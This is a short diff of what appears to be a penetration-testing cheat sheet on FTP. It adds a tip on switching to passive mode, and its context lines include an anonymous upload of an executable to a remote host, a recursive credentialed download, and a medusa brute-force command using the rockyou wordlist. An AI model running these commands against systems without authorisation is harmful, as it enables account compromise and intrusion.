@@ -158,6 +158,11 @@ ftp-upload -h {RHOST} -u 'anonymous' --password '' -d '/' {file.exe}
 # Recursively download ftp directory
 wget -r ftp://{USERNAME}:{PASSWORD@{IP ADDRESS}/
 
+# Note - If FTP is hung up on viewing directory, ex.: ftp>dir 229 Entering Extended Passive Mode (|||52924|)
+ftp> passive
+ftp> espv
+ftp> ls
+
 # Brute force FTP
 medusa -h {IP ADDRESS} -u {USER} -P /usr/share/wordlists/rockyou.txt -M ftp -t 10
 
